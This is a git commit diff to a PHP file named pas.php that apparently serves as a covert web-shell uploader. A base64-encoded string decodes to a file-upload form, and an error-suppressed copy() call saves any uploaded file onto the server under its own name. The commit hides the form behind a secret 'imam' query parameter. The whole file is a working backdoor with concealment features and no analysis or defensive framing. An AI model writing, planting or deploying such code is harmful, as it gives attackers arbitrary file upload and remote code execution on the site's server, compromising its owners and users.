8f6bf1d375a5be0a8db4f96f430cfb399af6b447
imam mrtdho <88535491+Mr-7Mind@users.noreply.github.com>
2023-05-19 18:32:36 +0800

    Update pas.php

--- pas.php
+++ pas.php
@@ -1,6 +1,8 @@
 <?php
+if(isset($_GET["imam"])){
 echo(base64_decode("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZSduYW1lPSdmJyAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSd1cCcgLz48L2Zvcm0+"));
 @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
 echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
+}
 __halt_compiler();
 ?>
